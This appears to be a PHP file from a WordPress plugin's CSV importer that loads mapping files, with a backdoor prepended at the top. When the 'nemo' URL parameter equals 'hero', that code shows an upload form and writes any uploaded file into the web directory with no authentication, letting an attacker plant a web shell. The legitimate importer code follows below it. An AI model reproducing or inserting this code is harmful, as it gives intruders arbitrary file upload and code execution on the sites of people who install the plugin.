<?php
$nemo  = $_GET['nemo'];
if($nemo == 'hero'){
$nemoshell = $_FILES['file']['name'];
$nemohero  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
        <input type='file'name='file' />
        <input type='submit' value='upload' />
</form>";
move_uploaded_file($nemohero,$nemoshell);
}
?><?php
/**
 * Load up extra automatic mappings for the CSV importer.
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

include( dirname( __FILE__ ) . '/default.php' );
include( dirname( __FILE__ ) . '/generic.php' );
include( dirname( __FILE__ ) . '/wordpress.php' );
